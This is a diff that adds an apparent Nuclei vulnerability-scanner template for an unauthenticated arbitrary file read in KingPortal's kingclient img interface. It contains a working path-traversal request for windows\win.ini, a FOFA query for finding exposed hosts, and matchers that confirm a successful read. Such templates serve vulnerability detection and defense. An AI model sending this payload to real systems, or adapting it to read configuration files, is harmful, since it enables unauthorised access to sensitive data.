@@ -1,0 +1,31 @@
+id: kingportal-kingclient-fileread
+
+info:
+  name: KingPortal kingclient - File Read
+  author: qwtd
+  severity: high
+  description: KingPortal客户端开发系统 img 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+  metadata:
+    fofa: title="KingPortal"
+    verified: true
+  tags: KingPortal
+
+http:
+  - raw:
+      - |
+        GET /kingclient/img?imgPath=..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+      
